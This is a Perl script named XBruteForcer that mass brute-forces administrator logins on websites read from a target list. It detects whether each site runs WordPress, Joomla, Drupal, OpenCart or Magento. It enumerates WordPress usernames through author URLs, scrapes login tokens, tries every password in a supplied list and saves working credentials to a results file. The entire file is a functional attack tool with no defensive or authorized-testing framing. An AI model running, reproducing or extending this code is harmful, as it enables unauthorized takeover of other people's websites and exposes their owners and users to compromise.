#!/usr/bin/perl

use if $^O eq "MSWin32", Win32::Console::ANSI;
use Term::ANSIColor;
use URI::URL;
use Getopt::Long;
use LWP::UserAgent;
use IO::Socket::INET;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)");
$ua->timeout (10);

if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }

GetOptions(
    "l|list=s" => \$list,
    "p|passwords=s" => \$pass,
);

banner();

unless ($list|$pass) { help(); }
if ($list|$pass) { XBruteForcer(); }

sub banner() {
print color('bold red')," __   __  ";
print color('bold white')," ____             _          ______                 \n";
print color('bold red')," \\ \\ / / ";
print color('bold white')," |  _ \\           | |        |  ____|                \n"; 
print color('bold red'),"  \\ V /  "; 
print color('bold white')," | |_) |_ __ _   _| |_ ___   |  |__ __  _ __ ___ ___ _ __ \n";
print color('bold red'),"   > <   "; 
print color('bold white')," |  _ <| '__| | | |  _/ _ \\  |  __/ _ \\| '__/ __/ _ \\ '__|\n";
print color('bold red'),"  / . \\ "; 
print color('bold white'),"  | |_) | |  | |_| | ||  __/  | | | (_) | | | (_|  __/ | \n";
print color('bold red')," /_/ \\_\\ "; 
print color('bold white')," |____/|_|   \\__,_|\\__\\___|  |_|  \\___/|_|  \\___\\___|_|  ";   
print color('bold red'),"v1.3\n\n";
print color('bold red'),"\t\t        [";
print color('bold white'),"Coded BY Mohamed Riahi";
print color('bold red'),"]\n";
print color('reset');
};

sub help {
print q(
Usage:  perl XBruteForcer.pl -l list.txt -p passwords.txt 

OPTIONS:
   -l   => websites list
   -p  => Passwords list
);
}

sub XBruteForcer {
print color('bold red')," [";
print color('bold green'),"1";
print color('bold red'),"]";
print color('bold white')," WordPress \n";
print color('bold red')," [";
print color('bold green');
print color('bold green'),"2";
print color('bold red'),"]";
print color('bold white')," Joomla \n";
print color('bold red')," [";
print color('bold green'),"3";
print color('bold red'),"]";
print color('bold white')," DruPal \n";
print color('bold red')," [";
print color('bold green'),"4";
print color('bold red'),"]";
print color('bold white')," OpenCart \n";
print color('bold red')," [";
print color('bold green'),"5";
print color('bold red'),"]";
print color('bold white')," Magento \n";
print color('bold red')," [";
print color('bold green'),"6";
print color('bold red'),"]";
print color('bold white')," Auto \n";
print color('bold red')," [";
print color('bold green'),"+";
print color('bold red'),"]";
print color('bold white')," Choose Number : ";

my $number = <STDIN>;
chomp $number;
print "\n";
if($number eq '1')
{
    open (THETARGET, "<$list") || die "[-] Can't open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);

print color('bold red'),"\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"$site";
wpuser();
}
}
if($number eq '2')
{
open (THETARGET, "<$list") || die "[-] Can't open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);

print color('bold red'),"\n\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"$site";
joomla();
}
}
if($number eq '3')
{

    open (THETARGET, "<$list") || die "[-] Can't open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);

print color('bold red'),"\n\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"$site";
drupal();
}
}
if($number eq '4')
{

    open (THETARGET, "<$list") || die "[-] Can't open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);

print color('bold red'),"\n\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"$site";
opencart();
}
}
if($number eq '5')
{

    open (THETARGET, "<$list") || die "[-] Can't open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);

print color('bold red'),"\n\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"$site";
magento();
}
}
if($number eq '6')
{

    open (THETARGET, "<$list") || die "[-] Can't open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);

print color('bold red'),"\n\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"$site";
cms();
}
}
}

################ CMS DETCTER #####################
sub cms(){
$magsite = $site . '/admin';
my $magcms = $ua->get("$magsite")->content;
my $cms = $ua->get("$site")->content;
if($cms =~/wp-content|wordpress/) {
print color('bold white')," - "; 
print color("bold green"), "WordPress";
wpuser();
}

elsif($cms =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
print color('bold white')," - "; 
print color("bold green"), "Joomla"; 
joomla();
}
elsif($cms =~/Drupal|drupal|sites\/all|drupal.org/) {
print color('bold white')," - "; 
print color("bold green"), "Drupal";
drupal();
}

elsif($cms =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
print color('bold white')," - "; 
print color("bold green"), "OpenCart";
opencart();
}

elsif($magcms =~/Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento/) {
   print color("bold green"), " - Magento";
magento();
}
else{
print color('bold white')," - ";  
print color("bold red"), "Unknown";
}
}


###### GET WP USER #######
sub wpuser{
print color('reset');
$user = $site . '/?author=1';

$getuser = $ua->get($user)->content;
if($getuser =~/author\/(.*?)\//){
$wpuser=$1;
print color('bold red'),"\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Username: $wpuser\n";
wp();
}
else {
print color('bold red'),"\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Can't Get Username\n";
}
}

###### WorDPress #######
sub wp{
print color('bold red'),"\n [";
print color('bold green'),"-";
print color('bold red'),"] ";
print color('bold white'),"Starting brute force\n";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$wp = $site . '/wp-login.php';
$redirect = $site . '/wp-admin/';
$wpass = $_;
print color('bold red'),"\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Trying: $wpass ";
$wpbrute = POST $wp, [log => $wpuser, pwd => $wpass, wp-submit => 'Log In', redirect_to => $redirect];
$response = $ua->request($wpbrute);
my $stat = $response->as_string;

if($stat =~ /Location:/){
if($stat =~ /wordpress_logged_in/){

print color('bold white'),"- ";
print color('bold green'),"FOUND\n";
print color('reset');

open (TEXT, '>>Result.txt');
print TEXT "$wp ==> User: $wpuser Pass: $wpass\n";
close (TEXT);
next OUTER;
}
}
}
}
###### Joomla #######
sub joomla{
$joomsite = $site . '/administrator/index.php';

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );


$getoken = $ua->get($joomsite)->content;
if ( $getoken =~ /name="(.*)" value="1"/ ) {
$token = $1 ;
}else{
print color('bold red'),"\n [";
print color('bold green'),"x";
print color('bold red'),"] ";
print color('bold white'),"Can't Grabb Joomla Token !\n";
next OUTER;
}

print color('bold red'),"\n [";
print color('bold green'),"-";
print color('bold red'),"] ";
print color('bold white'),"Starting brute force\n";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$joomuser = admin;
$joompass = $_;
print color('bold red'),"\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Trying: $joompass ";
$joomlabrute = POST $joomsite, [username => $joomuser, passwd => $joompass, lang =>en-GB, option => user_login, task => login, $token => 1];
$response = $ua->request($joomlabrute);

my $check = $ua->get("$joomsite")->content;
if ($check =~ /logout/){
print color('bold white'),"- ";
print color('bold green'),"FOUND\n";
print color('reset');

open (TEXT, '>>Result.txt');
print TEXT "$joomsite => User: $joomuser Pass: $joompass\n";
close (TEXT);
next OUTER;
}
}
}

######DruPal#######
sub drupal{
print color('bold red'),"\n [";
print color('bold green'),"-";
print color('bold red'),"] ";
print color('bold white'),"Starting brute force\n";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$druser = admin;
$drupass = $_;
print color('bold red'),"\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Trying: $drupass ";

$drupal = $site . '/user/login';
$redirect = $site . '/user/1';

$drupalbrute = POST $drupal, [name => $druser, pass => $drupass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $redirect];
$response = $ua->request($drupalbrute);
$stat = $response->status_line;
    if ($stat =~ /302/){
print color('bold white'),"- ";
print color('bold green'),"FOUND\n";
print color('reset');

open (TEXT, '>>Result.txt');
print TEXT "$drupal => User: $druser Pass: $drupass\n";
close (TEXT);
next OUTER;
}
}
}

###### OpenCart #######
sub opencart{
print color('bold red'),"\n [";
print color('bold green'),"-";
print color('bold red'),"] ";
print color('bold white'),"Starting brute force\n";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$ocuser = admin;
$ocpass = $_;
print color('bold red'),"\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Trying: $ocpass ";
$OpenCart= $site . '/admin/index.php';

$ocbrute = POST $OpenCart, [username => $ocuser, password => $ocpass,];
$response = $ua->request($ocbrute);
$stat = $response->status_line;
if ($stat =~ /302/){
print color('bold white'),"- ";
print color('bold green'),"FOUND\n";
print color('reset');
open (TEXT, '>>Result.txt');
print TEXT "$OpenCart => User: $ocuser Pass: $ocpass\n";
close (TEXT);
next OUTER;
}
}
}

###### Magento #######
sub magento{
$magsite = $site . '/admin';

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );
    
$getoken = $ua->get($magsite)->content;
if ( $getoken =~ /type="hidden" value="(.*)"/ ) {
$token = $1 ;
}else{
print color('bold red'),"\n [";
print color('bold green'),"x";
print color('bold red'),"] ";
print color('bold white'),"Can't Grabb Magento Token !\n";
next OUTER;
}

print color('bold red'),"\n [";
print color('bold green'),"-";
print color('bold red'),"] ";
print color('bold white'),"Starting brute force\n";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$maguser = "admin";
$magpass = $_;
print color('bold red'),"\n [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Trying: $magpass ";

$magbrute = POST $magsite, ["form_key" => "$token", "login[username]" => "$maguser", "dummy" => "", "login[password]" => "$magpass"];
$response = $ua->request($magbrute);
my $pwnd = $ua->get("$magsite")->content;
if ($pwnd =~ /logout/){
print color('bold white'),"- ";
print color('bold green'),"FOUND\n";
print color('reset');
open (TEXT, '>>Result.txt');
print TEXT "$magsite => User: $maguser Pass: $magpass\n";
close (TEXT);
next OUTER;
}
}
}
